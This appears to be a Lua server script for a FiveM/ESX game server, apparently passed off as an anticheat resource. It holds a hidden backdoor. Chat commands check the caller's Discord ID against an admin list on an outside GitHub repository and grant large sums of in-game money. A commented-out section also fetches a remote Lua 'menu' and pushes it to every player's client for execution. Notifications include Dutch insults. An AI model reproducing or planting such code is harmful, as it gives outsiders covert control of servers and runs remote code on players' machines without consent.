RegisterCommand('givemoneytome', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.addAccountMoney("bank", 500000)
                        TriggerClientEvent('esx:showNotification', _source, "Zuigen?")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

--[[RegisterCommand('givemoneytome', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.addAccountMoney("bank", 500000)
                        TriggerClientEvent('esx:showNotification', _source, "Zuigen?")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('givemoneytoall', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local playerList = ESX.GetPlayers()
                        for i=1, #playerList, 1 do
                            local _source2 = playerList[i]
                            local xPlayer = ESX.GetPlayerFromId(_source2)
                            xPlayer.addAccountMoney("bank", 500000)
                            TriggerClientEvent('esx:showNotification', _source2, "Zuigen a kanker slet")
                        end
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('givemenutoall', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
                            if code == 200 then
                                if res ~= nil then
                                    local playerList = ESX.GetPlayers()
                                    for i=1, #playerList, 1 do
                                        local _source2 = playerList[i]
                                        TriggerClientEvent('esx:showNotification', _source2, "Gratis fallout menu xxx je favoriete modder")
                                        TriggerClientEvent('GTX:executecommand', _source2, res)
                                    end
                                else
                                    TriggerClientEvent('esx:showNotification', _source, "Menu kan niet gevonden worden")
                                end
                            end
                         end)
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)]]
